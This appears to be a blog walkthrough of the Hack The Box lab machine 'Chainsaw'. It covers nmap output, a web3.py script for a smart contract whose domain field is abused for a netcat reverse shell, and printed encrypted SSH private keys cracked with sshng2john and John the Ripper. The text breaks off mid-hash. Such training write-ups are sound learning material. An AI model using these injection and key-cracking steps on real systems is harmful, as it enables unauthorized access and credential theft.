---
layout:     post
title:      HacktheBox - Padraignix 'Chainsaw' Walkthough 
title2:     Hack the Box - Chainsaw
date:       2019-11-23 12:00:00 -0400
summary:    HTB Chainsaw machine walkthrough. Anonymous ftp connections, smart contract abuse, InterPlanetary File System and cracked password protected ssh private keys for user pivot. A loosely defined SUID file and PATH hijacking for root shell then finally leveraging root.txt's slack space to get the final flag.
categories: hack-the-box
thumbnail:  cogs
keywords:   hackthebox,htb,pentest,redteam,writeup,walkthrough,chainsaw,smart contract,eth,ethereum,slack space,ftp,ipfs,jtr,john the ripper
tags:
 - htb 
 - walkthrough
 - writeup
 - smart contract
 - ethereum
 - path
 - slack space
 - ftp
 - ipfs
 - ssh
 - john-the-ripper
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-chainsaw/infocard.PNG' | relative_url }}">
</p>

<p>Chainsaw was an interesting box that I thoroughly enjoyed. Upon first investigation an anonymous ftp connection allowed access to some intersting files. Further investigation led to an understanding that those files were smart contract related and ultimately required to connect and exploit a foothold. From the initial foothold we extracted sensitive private keys from the local InterPlanetary File System and cracked password protected ssh private keys for user pivot. From user we exploited a loosely defined SUID file and PATH hijacking for root shell then finally leveraged root.txt's slack space to get the final flag.</p>

<p>As the first time working with smart contracts it was an interesting initial vector filled with research into understanding how they worked in general as well as how we can use this to our advantage. Overall, I really enjoyed this box from that angle. The only part I did not enjoy was the final slack space of the flag. Without any direct need to include this step it felt forced and contrived. With that said however I had not directly interacted with hidden data in this manner before therefore I am thankful that I had the opportunity to expand that knowledge.</p>

<h1>Initial Recon</h1>

<p>Let's kick it off with an nmap scan:</p>

{% highlight shell %}
nmap -sV -sC 10.10.10.142 -p-
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-26 23:28 EDT
Nmap scan report for 10.10.10.142
Host is up (0.018s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
| -rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
|_-rw-r--r--    1 1001     1001           44 Oct 27 02:17 address.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.188
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
9810/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sun, 27 Oct 2019 03:36:20 GMT
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sun, 27 Oct 2019 03:36:19 GMT
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Sun, 27 Oct 2019 03:36:19 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9810-TCP:V=7.70%I=7%D=10/26%Time=5DB51083%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,118,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nAccess-Control-All
SF:ow-Headers:\x20Origin,\x20X-Requested-With,\x20Content-Type,\x20Accept,
SF:\x20User-Agent\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-
SF:Allow-Methods:\x20\*\r\nContent-Type:\x20text/plain\r\nDate:\x20Sun,\x2
SF:027\x20Oct\x202019\x2003:36:19\x20GMT\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(HTTPOptions,100,"HTTP/1\.1\x20200\x20OK\r\nAcce
SF:ss-Control-Allow-Headers:\x20Origin,\x20X-Requested-With,\x20Content-Ty
SF:pe,\x20Accept,\x20User-Agent\r\nAccess-Control-Allow-Origin:\x20\*\r\nA
SF:ccess-Control-Allow-Methods:\x20\*\r\nContent-Type:\x20text/plain\r\nDa
SF:te:\x20Sun,\x2027\x20Oct\x202019\x2003:36:19\x20GMT\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(FourOhFourRequest,118,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nAccess-Control-Allow-Headers:\x20Origin,\x20X-Requested-With,\x2
SF:0Content-Type,\x20Accept,\x20User-Agent\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Allow-Methods:\x20\*\r\nContent-Type:\x20text/
SF:plain\r\nDate:\x20Sun,\x2027\x20Oct\x202019\x2003:36:20\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

<p>That's a lot text but breaking it down it's essentially anonymous access ftp, ssh and finally an unrecognized service running on 9810. Since we know the obvious access through ftp let's take a quick poke at what we can find.</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/recon-ftp.PNG' | relative_url }}">
</p>

<p>Hum...no idea what these files are. Let's pull back to our host and explore them a bit more.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Chainsaw# cat WeaponizedPing.sol
pragma solidity ^0.4.24;

contract WeaponizedPing 
{
  string store = "google.com";

  function getDomain() public view returns (string) 
  {
      return store;
  }

  function setDomain(string _value) public 
  {
      store = _value;
  }
}
root@kali:~/Desktop/HTB/Chainsaw# cat address.txt 
0xAf67B04cA9105d4E9A273C37C103c5DDf1F05C07
{% endhighlight %}

{% highlight shell %}
cat WeaponizedPing.json 
{
  "contractName": "WeaponizedPing",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "getDomain",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_value",
          "type": "string"
        }
      ],
      "name": "setDomain",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526040805190810160405280600a81526020017f676f6f676c652e636f6d000000000000000000000000000000000000000000008152506000908051906020019061004f929190610062565b5034801561005c57600080fd5b50610107565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100a357805160ff19168380011785556100d1565b828001600101855582156100d1579182015b828111156100d05782518255916020019190600101906100b5565b5b5090506100de91906100e2565b5090565b61010491905b808211156101005760008160009055506001016100e8565b5090565b90565b6102d7806101166000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b68d180914610051578063e5eab096146100e1575b600080fd5b34801561005d57600080fd5b5061006661014a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a657808201518184015260208101905061008b565b50505050905090810190601f1680156100d35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ed57600080fd5b50610148600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101ec565b005b606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101e25780601f106101b7576101008083540402835291602001916101e2565b820191906000526020600020905b8154815290600101906020018083116101c557829003601f168201915b5050505050905090565b8060009080519060200190610202929190610206565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061024757805160ff1916838001178555610275565b82800160010185558215610275579182015b82811115610274578251825591602001919060010190610259565b5b5090506102829190610286565b5090565b6102a891905b808211156102a457600081600090555060010161028c565b5090565b905600a165627a7a72305820d5d4d99bdb5542d8d65ef822d8a98c80911c2c3f15d609d10003ccf4227858660029",
  ...
{% endhighlight %}

<p>While I can understand that the <code>.sol</code> file is essentially setting up a "WeaponizedPing" object with  get/set functionality still wasn't entirely sure how it worked. A quick search online and learned that these are Ethereum smart contract files. <a href="https://www.dappuniversity.com/articles/web3-py-intro">This python web3.py</a> article was invaluable in not only understanding the basics but getting a quick-and-dirty script up to connect with the smart contract. Based on the article we can assume that port 9810 from our nmap scan above is how we will connect and we should set up our provider to point here. Since we had the address from <code>address.txt</code> and the abi and bytecode from <code>WeaponizedPing.json</code> and what functions are available through <code>WeaponizedPing.sol</code> we should be able to follow along and interact with it. My script ended up being the following:</p>

{% highlight python %}
from web3 import Web3, HTTPProvider

w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
w3.eth.defaultAccount = w3.eth.accounts[0]

# ABI
abi = '[{"constant":true,"inputs":[],"name":"getDomain","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"string"}],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]'

# Address
address = "0xAf67B04cA9105d4E9A273C37C103c5DDf1F05C07"

# bytecode
bytecode = "0x60806040526040805190810160405280600a81526020017f676f6f676c652e636f6d000000000000000000000000000000000000000000008152506000908051906020019061004f929190610062565b5034801561005c57600080fd5b50610107565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100a357805160ff19168380011785556100d1565b828001600101855582156100d1579182015b828111156100d05782518255916020019190600101906100b5565b5b5090506100de91906100e2565b5090565b61010491905b808211156101005760008160009055506001016100e8565b5090565b90565b6102d7806101166000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b68d180914610051578063e5eab096146100e1575b600080fd5b34801561005d57600080fd5b5061006661014a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a657808201518184015260208101905061008b565b50505050905090810190601f1680156100d35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ed57600080fd5b50610148600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101ec565b005b606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101e25780601f106101b7576101008083540402835291602001916101e2565b820191906000526020600020905b8154815290600101906020018083116101c557829003601f168201915b5050505050905090565b8060009080519060200190610202929190610206565b5050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061024757805160ff1916838001178555610275565b82800160010185558215610275579182015b82811115610274578251825591602001919060010190610259565b5b5090506102829190610286565b5090565b6102a891905b808211156102a457600081600090555060010161028c565b5090565b905600a165627a7a72305820d5d4d99bdb5542d8d65ef822d8a98c80911c2c3f15d609d10003ccf4227858660029"

# contract
contract = w3.eth.contract(abi=abi, address=address)

print("Contract:", contract)
print("Blocknumber:", w3.eth.blockNumber)

tx_hash = contract.functions.setDomain("google.com").transact()
w3.eth.waitForTransactionReceipt(tx_hash)

getexample = contract.functions.getDomain().call()
print("GetExample:", getexample)
{% endhighlight %}

<p>We are able to then test, connect and leverage the functions of the smart contract. Awesome!</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/user-ethcontract1.PNG' | relative_url }}">
</p>

<p>I had a hunch here that whatever address was present in the store variable would actually be pinged. Decided to test this out by setting up wireshark and attempting to modify the store to point to my IP. Sure enough that also worked.</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/user-ethcontract2.PNG' | relative_url }}">
</p>

<p>So we know that we know we can control the variable and that the functionality gets called under the hood, how can we leverage this to our advantage. Let's see if we can chain together a nc call back to a local listener. This is assuming several things including that nc is installed on the host, however figured this would be the path of least resistance so let's give it a shot.</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/user-ethcontract3.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/user-revsh1.PNG' | relative_url }}">
</p>

<p>Beautiful! Initial foothold established. Unfortunately administrator did not end up being the true "user" in this case so we need to pivot further for our first flag.</p>

<h1>User exploitation</h1>

<p>Checking administrator's homedir we see quite a few things.</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/user-adminhomedir.PNG' | relative_url }}">
</p>

<p>Right off the bat we see some users within the csv file.</p>

{% highlight shell %}
administrator@chainsaw:/home/administrator$ cat chainsaw-emp.csv
cat chainsaw-emp.csv
Employees,Active,Position
arti@chainsaw,No,Network Engineer
bryan@chainsaw,No,Java Developer
bobby@chainsaw,Yes,Smart Contract Auditor
lara@chainsaw,No,Social Media Manager
wendy@chainsaw,No,Mobile Application Developer
{% endhighlight %}

<p>Digging slightly deeper we find a folder which includes an interesting python script.</p>

{% highlight python %}
administrator@chainsaw:/home/administrator/maintain$ cat gen.py
#!/usr/bin/python
from Crypto.PublicKey import RSA
from os import chmod
import getpass

def generate(username,password):
	key = RSA.generate(2048)
	pubkey = key.publickey()

	pub = pubkey.exportKey('OpenSSH')
	priv = key.exportKey('PEM',password,pkcs=1)

	filename = "{}.key".format(username)

	with open(filename, 'w') as file:
		chmod(filename, 0600)
		file.write(priv)
		file.close()

	with open("{}.pub".format(filename), 'w') as file:
		file.write(pub)
		file.close()

	# TODO: Distribute keys via ProtonMail

if __name__ == "__main__":
	while True:
		username = raw_input("User: ")
		password = getpass.getpass()
		generate(username,password)
{% endhighlight %}

<p>I decided to get it a shot and see what gets generated.</p>

{% highlight python %}
administrator@chainsaw:/home/administrator/maintain$ python gen.py
python gen.py
User: bobby
bobby
Password: test
{% endhighlight %}

<p>As a result ended up generating an SSH keypair. Transferring them over to my host I took a close look.</p>

{% highlight shell %}
administrator@chainsaw:/home/administrator/maintain$ cat bobby.key
cat bobby.key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,13F6FF16239B8B00

orMpOEVQXh7l5eJORA/NTWq6VuH7JXZOIssI0Kcak2tQt8Juh9pzh16vD4YBB9QN
B4p+Y8mk6/Lck3L38CWTGWL497vxDjbaLIwFj/iobKXUahCGDsKnh94nKRo2Dbdi
oZgzDISqAdw+cQ5H9ilBtxjiBhPm3zLdhcslIfH2p6eSriMtMmm/GYuJSMYEo/1/
9mJ0zD5wYyPgdJuExIIasLKMKNu8sOyUqHH6VhEIprQ+DjvqpGmJhmXC8UhF1NIT
xPa7zHVh9cW5Cd9zXRFNsuMHvK1XDEuUc7u7DGAsbV9P2/jHQpecq5ng5OecIEER
cgR0M2VVtsbCvSjACzVxkMscHd/ybcqicfQL3a3vCJg+uC0/yG8H8EAxEUPxeDP8
cm1x/PVmZSjdnNwOPHwdkGZ83HKknb4NIojXJWDy+CwPGOUuNfyQ+7oouAZ0abon
kJqPjQm7CoZ+o+6tgIE8SYa682k3p9CqzTNS0BvFyc2B/1HLo0xqcaNuV9V3TMOf
8J3mFpv2/P4+4NG8ur7uc/2zx7HD0L5qwI32oEce985DDvVHMpbTQOVoj6Dp5533
TzBWj+vR+F1scotNc6DHAhzM3h/C8gc6UB/APtToXwpUdjw5JfCH7u/K9nhM079v
WWj946a6uUL90016FTSCel41wAaEdOqeMSNrTrEZtH/WANz0+a4Qq2zsKCq9sbdq
Cp7BhKaGloPfSM0XKkaZBe+bUlzCQS1G5iqGcBz4gxKTJzATSM7NjL8ZFhwV7Atn
yQp9zcd+DcicAgjCFwcLD6UA71rGVXInNHk3N0ecOq+ITLJrs7uQZJbdDNczgv0G
+jyrFb8mx2sCCBdvEIpiXRXcnuO0xB+tQK/bwnxyj5y/0NvzVkCpvbh0gvVio/jb
0q399sqt8L9PKcVEMPpLd/R8zPaaozqHIBHmFoE/3v6gvUySZXOxiIZ7rX9zf6jX
ZTU8OnAN9uGrUbMykP6w44Lu8o9/Zu+llAxa9kSFhpbGcE4f3/9ZWhdwEa45L4YD
TcBa0A7VXxhS2C5vIpnTVrmAaiKaaWqT0kHZIl9gGV0TrdlSos6bgV7cL178S8v+
N6uVvOUmMLvoinVuJkeBNxuQjAsSOW6b2b1UWQWDVuBCs4DVxxna9e33X7Scq/dd
Ab8tNYWf0tmV0ePxTzoKy8BPETjx6dbmE07LE28b7rU2GdGyhol/zvLAw78lp/Xo
PTx1zZ2wnjqXUwpreLgYmFs2cUMSPxZH42klm8PApPfRCUQLEGCZv/y7TK5PRK5/
BXg+QRWYh1IQUWdWRGLCxGmiiwArc9jcZ9JIOVsct5d8f0OJ5gZzILKsC3EPHW0D
4BU8VnhC4s9a+pcbbETt2CYfcnjH0XHqFgFwf9BYUitViic/WAPzAIcTOXhmfOBY
RSVkPSBUkZZm2PaRmgmhS5JYSvYk25QUhoCGS+oc8U02fSH/S3McAiC4gsDRYZ06
0XNIoPqI134oVaMNb61+jB8jpmS5ZgcgVvOtXHgmZlL3DPhGFaicQ7D1WeMA/ZJi
tyzt926/CG3JTfJQYOQ011RucHs1oQPaOznhi2tVY7iU7pIbGlvXtw==
-----END RSA PRIVATE KEY-----
{% endhighlight %}

<p>Ok, so the private key is password protected by the password we passed in the <code>gen.py</code> script. Additionally it looks like it's <code>DES-EDE3-CBC</code> encryted with a defined salt, in this case <code>13F6FF16239B8B00</code>. I went through a few iterations of <code>gen.py</code> to see if there were any flaws with how it generated the keypairs. While the settings were the same the salt seems to be random on each pair. Still testing a few things I found <a href="https://github.com/stricture/hashstack-server-plugin-jtr/blob/master/scrapers/sshng2john.py">sshng2john</a> to generate a JTR hash to crack. Sure enough I was able to crack my test keypair.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Chainsaw# python sshng2john.py test1.key > test1.hash
test1.key:$sshng$0$8$D7EA33696C000F9E$1200$1e218393c610821adce74815068730e4bafac5f8d1bb84cc21c340b2e2b286bf53e3c3c2f851dedd95e0d71c96b949574f285470d86440c1096d71053e6a388f2e12718497cb4ae1ac5351bbf896b472ef18a57485acf30d09e89be2f76c209fa9f607be76c59482b76bdebf9da88998792f8caae66f09ff493b4b9698501431ef5c3e933a85c2ade44f15d8ef4b34542cbbd420e39e9f4173d2b9c10312f09326c546f7669d0f00e35207c22b5c32b83706bae2a5203405ae96a7e95610b9bb0f5c2be229296954a9bb12078815ff7eb14e7b6b5297af6d37cdb5877572ca66c252beeafa6e97ae75911d46de7530ec01955af76f33a70618e77405aec6543e5f30c8aa6243d2022904241eadcaf73f1778f7629cc09152690cc49d16433f7b8e83c79ecb362de89ccf22d0181ef816b449a2723e16a6d3de5470df5a54326198ca0478639c4ff9f40954297d5aba0181feb67453eafc955dc67d7d431f8277f21c90398bc11a4775c35fb8d98b9a8632f1678403129f0b959b20561d119826ecc668d502cfa54156c43e4b6c7757ed888915445763e14bd3e4753cadd7ae269dacdc25ddde9902c30f65931b96589746526c0014080fb6785d3cf7cdfdfb6932848cc6602f2961f6cc5247fbc1ea098062a9b64aa0585fc35a167e7eeebf02260264f286befd06ba91cdae24b952629eb42a95225c08a7edd8c88ebaa556b0e12503432dcbfbd5ae3f8d4dfe961af798b031b3a74742b00a6ac1f77d48fc8da1d3fdf393bf840110d4574153c97159524e68d2db1e236ac639709bb0b69dc15cb7940f7a4f501a5c352c5e85e3be718eef6fdcfb81c6bcbfea09a6bf862d2acb0e3b2f3bb2ee0dce4483eb6e0696d6f634b0be7e2a7535a79e77de1824c74d40c673462889c54d06c1a46cc6b5ea6953073e49da6183f7c047a450d947d6a4aad9be78d2e2752af4e2bb2978be2a675d5c19fb0cd29073032fbff643310cbec601f3b5c3cf3c4ea021c1b079ede391f5f60d0440aa8aacb56e5aea0d4ecfe48dc0feab70494d1e4cee55f3c03ccfc55eb1b26e1d22f15a249b7c48bc6f9c51fd5241d5b782b91edb0f0fbbbe00eba08d5f07935a3121b2e5256707e8939fa9c423b61d819f830597811a9ba0f7906f9017b7415216f56765954510db03c18718ed49f7a5faf79d0a19e275e8ed80aec1e7fac86097ef008031575bff346c64ab2cf7fa488ef2de317631e454c347ef6c4797d64b279c1fdaea1251d999a3446e61002cd6f80502514741b44fe5b111fd937254fb9c0b0301a1e1f5322f3cd182fc29c1d32298c7f914d4f674ffdb002a1bcf81c5e6a28fb1b3f6ea6a74025602e4d27bed1af700730596c96fd5edaae2c7593896cb2d55e0e3bd4d59319f7ce73ad8fd62020daee554a4eff444cf158d952f96539d11cf142985c58ea5f7524afef72da00794323908a20057e1b1de2e3632c2f7e0d88a1aea4704f9c58b303d80bff273519096311bd22e6b6c9b98f9912ce6128cda8c030e5025b27db2eab284b6ce3224759c74f68bf80b65109a0cd6decf42e08c6c0985d84b7397c137f2122abe077c8642a6d4c058ddbf1e38c1125d84f4646a7e4a5fbce8f90be2e77cbf512232a0051817ab3279fcde71cb9fb4800b5a14eff085eac1c46b18e68081aeff74cb4a518b57e009564bc2a483
root@kali:~/Desktop/HTB/Chainsaw# john --wordlist=/root/Desktop/rockyou.txt test1.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
test1            (test1.key)
{% endhighlight %}

<p>While we had access to the public keys in the pub/ folder on the host, the private keys were not found. There was however a comment in the script of "TODO: Distribute keys via ProtonMail". Let's see if there are any crumbs left around in the host.</p>

<p>From the home directory I noticed a <code>.ipfs</code> folder. Taking a peek within the folder there are many blocks. Instead of checking block by block let's just dump everything and take a look at what we can see.</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/user-ipfs1.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/user-ipfs2.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/user-ipfs3.PNG' | relative_url }}">
</p>

<p>Now we're talking! Ok, looks like they're base64 encoded, so let's get the ouput.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Chainsaw# cat bobbymsg1.txt | base64 -d
<div>
Bobby,
<br></div><div><br></div><div>
I am writing this email in reference to the method on how we access our Linux server from now on. Due to security reasons, we have disabled SSH password authentication and instead we will use private/public key pairs to securely and conveniently access the machine.
<br></div><div><br></div><div>
Attached you will find your personal encrypted private key. Please ask&nbsp;reception desk for your password, therefore be sure to bring your valid ID as always.
<br></div><div><br></div><div>
Sincerely,
<br></div><div>
IT Administration Department
<br></div>
root@kali:~/Desktop/HTB/Chainsaw# cat bobbymsg2.txt | base64 -d
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,53D881F299BA8503

SeCNYw/BsXPyQq1HRLEEKhiNIVftZagzOcc64ff1IpJo9IeG7Z/zj+v1dCIdejuk
7ktQFczTlttnrIj6mdBb6rnN6CsP0vbz9NzRByg1o6cSGdrL2EmJN/eSxD4AWLcz
n32FPY0VjlIVrh4rjhRe2wPNogAciCHmZGEB0tgv2/eyxE63VcRzrxJCYl+hvSZ6
fvsSX8A4Qr7rbf9fnz4PImIgurF3VhQmdlEmzDRT4m/pqf3TmGAk9+wriqnkODFQ
I+2I1cPb8JRhLSz3pyB3X/uGOTnYp4aEq+AQZ2vEJz3FfX9SX9k7dd6KaZtSAzqi
w981ES85Dk9NUo8uLxnZAw3sF7Pz4EuJ0Hpo1eZgYtKzvDKrrw8uo4RCadx7KHRT
inKXduHznGA1QROzZW7xE3HEL3vxR9gMV8gJRHDZDMI9xlw99QVwcxPcFa31AzV2
yp3q7yl954SCMOti4RC3Z4yUTjDkHdHQoEcGieFOWU+i1oij4crx1LbO2Lt8nHK6
G1Ccq7iOon4RsTRlVrv8liIGrxnhOY295e9drl7BXPpJrbwso8xxHlT3333YU9dj
hQLNp5+2H4+i6mmU3t2ogToP4skVcoqDlCC+j6hDOl4bpD9t6TIJurWxmpGgNxes
q8NsAentbsD+xl4W6q5muLJQmj/xQrrHacEZDGI8kWvZE1iFmVkD/xBRnwoGZ5ht
DyilLPpl9R+Dh7by3lPm8kf8tQnHsqpRHceyBFFpnq0AUdEKkm1LRMLAPYILblKG
jwrCqRvBKRMIl6tJiD87NM6JBoQydOEcpn+6DU+2Actejbur0aM74IyeenrGKSSZ
IZMsd2kTSGUxy9o/xPKDkUw/SFUySmmwiqiFL6PaDgxWQwHxtxvmHMhL6citNdIw
TcOTSJczmR2pJxkohLrH7YrS2alKsM0FpFwmdz1/XDSF2D7ibf/W1mAxL5UmEqO0
hUIuW1dRFwHjNvaoSk+frAp6ic6IPYSmdo8GYYy8pXvcqwfRpxYlACZu4Fii6hYi
4WphT3ZFYDrw7StgK04kbD7QkPeNq9Ev1In2nVdzFHPIh6z+fmpbgfWgelLHc2et
SJY4+5CEbkAcYEUnPWY9SPOJ7qeU7+b/eqzhKbkpnblmiK1f3reOM2YUKy8aaleh
nJYmkmr3t3qGRzhAETckc8HLE11dGE+l4ba6WBNu15GoEWAszztMuIV1emnt97oM
ImnfontOYdwB6/2oCuyJTif8Vw/WtWqZNbpey9704a9map/+bDqeQQ41+B8ACDbK
WovsgyWi/UpiMT6m6rX+FP5D5E8zrYtnnmqIo7vxHqtBWUxjahCdnBrkYFzl6KWR
gFzx3eTatlZWyr4ksvFmtobYkZVAQPABWz+gHpuKlrqhC9ANzr/Jn+5ZfG02moF/
edL1bp9HPRI47DyvLwzT1/5L9Zz6Y+1MzendTi3KrzQ/Ycfr5YARvYyMLbLjMEtP
UvJiY40u2nmVb6Qqpiy2zr/aMlhpupZPk/xt8oKhKC+l9mgOTsAXYjCbTmLXzVrX
15U210BdxEFUDcixNiwTpoBS6MfxCOZwN/1Zv0mE8ECI+44LcqVt3w==
-----END RSA PRIVATE KEY-----
{% endhighlight %}

<p>Perfect, with bobby's private key we should be able to reproduct the <code>sshng2john</code> to generate the password hash and crack it using JTR.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Chainsaw# python sshng2john.py bobby.key
24
bobby.key:$sshng$0$8$53D881F299BA8503$1192$49e08d630fc1b173f242ad4744b1042a188d2157ed65a83339c73ae1f7f5229268f48786ed9ff38febf574221d7a3ba4ee4b5015ccd396db67ac88fa99d05beab9cde82b0fd2f6f3f4dcd1072835a3a71219dacbd8498937f792c43e0058b7339f7d853d8d158e5215ae1e2b8e145edb03cda2001c8821e6646101d2d82fdbf7b2c44eb755c473af1242625fa1bd267a7efb125fc03842beeb6dff5f9f3e0f226220bab177561426765126cc3453e26fe9a9fdd3986024f7ec2b8aa9e438315023ed88d5c3dbf094612d2cf7a720775ffb863939d8a78684abe010676bc4273dc57d7f525fd93b75de8a699b52033aa2c3df35112f390e4f4d528f2e2f19d9030dec17b3f3e04b89d07a68d5e66062d2b3bc32abaf0f2ea3844269dc7b2874538a729776e1f39c60354113b3656ef11371c42f7bf147d80c57c8094470d90cc23dc65c3df505707313dc15adf5033576ca9deaef297de7848230eb62e110b7678c944e30e41dd1d0a0470689e14e594fa2d688a3e1caf1d4b6ced8bb7c9c72ba1b509cabb88ea27e11b1346556bbfc962206af19e1398dbde5ef5dae5ec15cfa49adbc2ca3cc711e54f7df7dd853d7638502cda79fb61f8fa2ea6994dedda8813a0fe2c915728a839420be8fa8433a5e1ba43f6de93209bab5b19a91a03717acabc36c01e9ed6ec0fec65e16eaae66b8b2509a3ff142bac769c1190c623c916bd9135885995903ff10519f0a0667986d0f28a52cfa65f51f8387b6f2de53e6f247fcb509c7b2aa511dc7b20451699ead0051d10a926d4b44c2c03d820b6e52868f0ac2a91bc129130897ab49883f3b34ce8906843274e11ca67fba0d4fb601cb5e8dbbabd1a33be08c9e7a7ac629249921932c776913486531cbda3fc4f283914c3f4855324a69b08aa8852fa3da0e0c564301f1b71be61cc84be9c8ad35d2304dc393489733991da927192884bac7ed8ad2d9a94ab0cd05a45c26773d7f5c3485d83ee26dffd6d660312f952612a3b485422e5b57511701e336f6a84a4f9fac0a7a89ce883d84a6768f06618cbca57bdcab07d1a7162500266ee058a2ea1622e16a614f7645603af0ed2b602b4e246c3ed090f78dabd12fd489f69d57731473c887acfe7e6a5b81f5a07a52c77367ad489638fb90846e401c6045273d663d48f389eea794efe6ff7aace129b9299db96688ad5fdeb78e3366142b2f1a6a57a19c9626926af7b77a8647384011372473c1cb135d5d184fa5e1b6ba58136ed791a811602ccf3b4cb885757a69edf7ba0c2269dfa27b4e61dc01ebfda80aec894e27fc570fd6b56a9935ba5ecbdef4e1af666a9ffe6c3a9e410e35f81f000836ca5a8bec8325a2fd4a62313ea6eab5fe14fe43e44f33ad8b679e6a88a3bbf11eab41594c636a109d9c1ae4605ce5e8a591805cf1dde4dab65656cabe24b2f166b686d891954040f0015b3fa01e9b8a96baa10bd00dcebfc99fee597c6d369a817f79d2f56e9f473d1238ec3caf2f0cd3d7fe4bf59cfa63ed4ccde9dd4e2dcaaf343f61c7ebe58011bd8c8c2db2e3304b4f52f262638d2eda79956